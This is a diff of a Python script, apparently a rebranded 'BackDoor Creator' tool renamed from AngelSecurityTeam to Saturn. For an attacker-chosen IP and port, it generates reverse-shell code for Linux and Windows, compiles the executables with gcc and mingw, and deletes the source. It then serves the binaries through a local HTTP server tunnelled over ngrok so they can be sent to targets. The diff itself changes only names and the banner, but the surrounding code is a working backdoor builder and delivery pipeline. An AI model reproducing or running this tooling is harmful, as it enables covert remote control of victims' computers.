@@ -13,15 +13,13 @@ def main():
 
     print ("""
 \033[1;36m
- ███████████                     █████      █████   █████   █████████            █████     
-░░███░░░░░███                   ░░███      ░░███   ░░███   ███░░░░░███          ░░███      
- ░███    ░███  ██████    ██████  ░███ █████ ░███    ░███  ░███    ░███   ██████  ░███ █████
-\033[1;39m ░██████████  ░░░░░███  ███░░███ ░███░░███  ░███████████  ░███████████  ███░░███ ░███░░███ 
- ░███░░░░░███  ███████ ░███ ░░░  ░██████░   ░███░░░░░███  ░███░░░░░███ ░███ ░░░  ░██████░  
- ░███    ░███ ███░░███ ░███  ███ ░███░░███  ░███    ░███  ░███    ░███ ░███  ███ ░███░░███ 
- ███████████ ░░████████░░██████  ████ █████ █████   █████ █████   █████░░██████  ████ █████
-\033[1;39m░░░░░░░░░░░   ░░░░░░░░  ░░░░░░  ░░░░ ░░░░░ ░░░░░   ░░░░░ ░░░░░   ░░░░░  ░░░░░░  ░░░░ ░░░░░ 
-                                 \033[1;36m  ANGELSECURITYTEAM 
+███████╗ █████╗ ████████╗██╗   ██╗██████╗ ███╗   ██╗
+██╔════╝██╔══██╗╚══██╔══╝██║   ██║██╔══██╗████╗  ██║
+███████╗███████║   ██║   ██║   ██║██████╔╝██╔██╗ ██║
+╚════██║██╔══██║   ██║   ██║   ██║██╔══██╗██║╚██╗██║
+███████║██║  ██║   ██║   ╚██████╔╝██║  ██║██║ ╚████║
+╚══════╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝                                                 
+    \033[1;36m  \|BackDoor Creator |/
 """)
 
 
@@ -43,13 +41,13 @@ def banner():
         host = input("\n\033[1;36mIP: \033[1;39m" )
         port = input("\n\033[1;36mPORT: \033[1;39m" )
         linux_shell(host, port)
-        os.system("gcc .linux.c -o AngelSecurityTeam-BackdoorLinux -pthread && rm -rf .linux.c")
-        os.system("chmod +x AngelSecurityTeam-BackdoorLinux")
-        print("\n\033[1;36mFile Saved > \033[1;39mAngelSecurityTeam-BackdoorLinux")
+        os.system("gcc .linux.c -o Saturn-Linux -pthread && rm -rf .linux.c")
+        os.system("chmod +x Saturn-Linux")
+        print("\n\033[1;36mFile Saved > \033[1;39mSaturn-Linux")
         #http.server 80
         os.system("python3 -m http.server 80 > .server 2> /dev/null &")          
         os.system("chmod +x ngrok")
-        name1="/AngelSecurityTeam-BackdoorLinux"
+        name1="/Saturn-Linux"
         portN=80
         os.system("./ngrok http {} > /dev/null &".format(portN))
         sleep(8)
@@ -69,13 +67,13 @@ def banner():
         host = input( "\n\033[1;36mIP: \033[1;39m" )
         port = input("\n\033[1;36mPORT: \033[1;39m" )
         windows_reverse(host, port)
-        os.system("/usr/bin/i686-w64-mingw32-gcc .windows.c -o AngelSecurityTeam-BackdoorWindows.exe -lws2_32 && rm -rf .windows.c")
-        print("\n\033[1;36mFile Saved > \033[1;39mAngelSecurityTeam-BackdoorWindows")
+        os.system("/usr/bin/i686-w64-mingw32-gcc .windows.c -o Saturn-Windows.exe -lws2_32 && rm -rf .windows.c")
+        print("\n\033[1;36mFile Saved > \033[1;39mSaturn-Windows")
 
         #http.server 80
         os.system("python3 -m http.server 80 > .server 2> /dev/null &")          
         os.system("chmod +x ngrok")
-        name2="/AngelSecurityTeam-BackdoorWindows.exe"
+        name2="/Saturn-Windows.exe"
         portN=80
         os.system("./ngrok http {} > /dev/null &".format(portN))
         sleep(8)
